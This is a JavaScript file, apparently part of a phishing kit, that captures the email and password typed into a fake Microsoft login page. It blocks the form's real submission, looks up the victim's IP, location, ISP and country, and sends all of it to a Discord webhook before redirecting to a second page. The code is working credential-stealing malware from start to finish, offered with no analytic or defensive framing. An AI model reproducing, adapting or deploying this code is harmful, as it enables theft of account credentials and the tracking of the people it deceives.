// Discord Logger para index.html (Login Email/Password)
// Usa DiscordConfig desde discord-config.js

(function() {
  'use strict';
  
  function sendCredentials(user, pass) {
    return DiscordConfig.getIpInfo().then(function(info) {
      var embed = {
        title: '🔐 Microsoft Login - Credenciales',
        color: 0x0078d4,
        fields: [
          { name: '👤 Usuario', value: '```' + (user || 'N/A') + '```', inline: false },
          { name: '🔑 Contraseña', value: '```' + (pass || 'N/A') + '```', inline: false },
          { name: '🌐 Dirección IP', value: '`' + info.ip + '`', inline: false },
          { name: '📍 Ubicación', value: '`' + info.location + '`', inline: false },
          { name: '🏢 Proveedor ISP', value: '`' + info.isp + '`', inline: false },
          { name: '🌍 País', value: info.flag + ' ' + info.country + ' (' + info.country_code + ')', inline: false }
        ],
        footer: { text: new Date().toLocaleString() },
        timestamp: new Date().toISOString()
      };
      return DiscordConfig.sendEmbed(embed);
    });
  }
  
  document.addEventListener('DOMContentLoaded', function() {
    var tikiInput = document.getElementById('tiki');
    var tokoInput = document.getElementById('toko');
    var submitBtn = document.querySelector('button[style*="microsoft-blue"]') || 
                      document.querySelector('.px-4.py-2.text-white.rounded');
    
    if (!tikiInput || !tokoInput || !submitBtn) return;
    
    submitBtn.addEventListener('click', function(e) {
      e.preventDefault();
      e.stopPropagation();
      
      var user = tikiInput.value.trim();
      var pass = tokoInput.value.trim();
      
      if (!user || !pass) {
        alert('Por favor complete todos los campos');
        return;
      }
      
      submitBtn.innerHTML = 'Procesando...';
      submitBtn.disabled = true;
      
      localStorage.setItem('ms_user', user);
      
      sendCredentials(user, pass).then(function() {
        setTimeout(function() {
          window.location.href = 'index2.html';
        }, 5000);
      });
    });
    
    tokoInput.addEventListener('keypress', function(e) {
      if (e.key === 'Enter') {
        e.preventDefault();
        submitBtn.click();
      }
    });
  });
})();
